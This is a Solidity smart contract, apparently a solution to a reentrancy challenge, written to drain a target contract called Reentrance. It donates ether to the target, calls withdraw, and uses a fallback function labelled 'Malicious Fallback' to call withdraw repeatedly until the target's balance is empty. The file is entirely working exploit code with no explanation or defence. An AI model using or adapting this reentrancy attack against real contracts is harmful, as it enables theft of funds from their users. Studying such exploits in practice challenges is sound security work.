// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance(payable(contractAddress)).donate{value: address(this).balance}(address(this));
        Reentrance(contractAddress).withdraw();
    }

    /// @dev Malicious Fallback
    fallback() external payable {
        if (contractAddress.balance != 0 ) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
